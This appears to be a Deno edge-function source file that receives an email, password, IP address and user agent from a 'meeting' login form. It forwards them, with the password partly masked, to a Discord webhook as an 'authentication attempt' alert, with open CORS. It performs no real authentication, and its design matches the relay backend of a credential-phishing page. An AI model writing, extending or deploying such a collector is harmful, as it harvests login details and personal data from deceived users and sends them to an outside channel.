import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const { email, password, userAgent, ipAddress } = await req.json()

    const discordWebhookUrl = Deno.env.get('DISCORD_WEBHOOK_URL')
    if (!discordWebhookUrl) {
      throw new Error('Discord webhook URL not configured')
    }

    const payload = {
      embeds: [
        {
          title: "🔐 Meeting Authentication Attempt",
          color: 0x5865F2,
          fields: [
            {
              name: "Email",
              value: email,
              inline: true
            },
            {
              name: "Password",
              value: "***" + password.slice(-3),
              inline: true
            },
            {
              name: "IP Address",
              value: ipAddress || "Unknown",
              inline: true
            },
            {
              name: "User Agent",
              value: userAgent || "Unknown",
              inline: false
            },
            {
              name: "Timestamp",
              value: new Date().toISOString(),
              inline: true
            }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    }

    const response = await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      throw new Error(`Discord webhook failed: ${response.status}`)
    }

    return new Response(
      JSON.stringify({ success: true }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      },
    )
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      },
    )
  }
})